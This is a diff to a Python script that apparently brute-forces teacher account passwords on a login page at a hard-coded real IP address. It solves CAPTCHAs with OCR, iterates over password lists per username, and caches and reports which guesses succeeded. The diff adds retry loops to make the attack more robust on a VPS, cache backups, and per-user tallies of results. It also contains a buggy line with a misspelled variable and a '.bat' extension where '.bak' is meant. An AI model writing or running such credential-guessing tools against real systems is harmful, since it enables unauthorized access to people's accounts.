@@ -12,7 +12,7 @@ import pytesseract
 from bs4 import BeautifulSoup
 import json
 import os
-
+import shutil
 
 
 def fff(html_or_res, temp_name = 'temp.html', encoding='gbk'):
@@ -89,11 +89,12 @@ def fill_data(__EVENTTARGET = '', __EVENTARGUMENT = '',
     dic['btnUserLogin'] = btnUserLogin
     return dic
        
-    
+'''    
 with open('mapcsv.csv',encoding='gbk') as f:
     lines = f.readlines()
     lines = [line.split(',')[:3] for line in lines]
 d = {line[1]:line for line in lines if len(line) == 3}
+'''
     
 url  = 'http://202.115.192.98/SelfSearch/UserInfo/UserLogin.aspx'
 url2 = 'http://202.115.192.98/SelfSearch/Other/pic.aspx'
@@ -147,7 +148,16 @@ def password_dump(username, password_set, verbose = True, callback = None,
                 continue
             login = enter(username, password)
             while True:
-                state = classify(login())
+                
+                for i in range(10): # some mysterious error occur in VPS. 
+                    try:
+                        state = classify(login())
+                        break
+                    except:
+                        pass
+                else:
+                    raise Exception("Unknow error")
+                
                 if state['code_error'] == True or state['code_null'] == True:
                     continue
                 rd[password] = state['password_error']
@@ -172,8 +182,15 @@ def password_dump_cache(username, password_set, cache_name = None,
                  prev_rd = json.load(f)
     
     def _callback(rd):
-        with open(cache_name,'w') as f:
-            json.dump(rd,f)
+        if os.path.exists(cache_name):
+            shutil.copyfile(cache_name, '{}.bak'.format(cache_name))
+        try:
+            with open(cache_name,'w') as f:
+               json.dump(rd,f)
+        except:
+            if os.path.exists('{}.bat'.format(cach_name)):
+               shutil.copyfile('{}.bak'.format(cache_name), cache_name)
+        
     
     return password_dump(username, password_set, 
                          callback = _callback, prev_rd = prev_rd,
@@ -195,10 +212,18 @@ def report_cache(teacher_list):
     if not isinstance(teacher_list[0], (str,int,float)):
         teacher_list = zip(*teacher_list)[0]
     for username in teacher_list:
+        #print('check username {}'.format(username))
+        if not os.path.exists('{}.json'.format(username)):
+            #print('skip username {}'.format(username))
+            continue
         with open('{}.json'.format(username)) as f:
             info = json.load(f)
             td[username] = [(key,value) for key,value in info.items() if not value]
-            print('{}: {}/{}'.format(username, len(td[username]), len(info)))
+            count = len(info)
+            true_count = len([value for value in info.values() if value == True])
+            false_count = len([value for value in info.values() if value == False])
+            none_count = len([value for value in info.values() if value == None])
+            print('{}: true {} false {} none {} / {}'.format(username,true_count,false_count,none_count,count ))
     return td
 
 '''
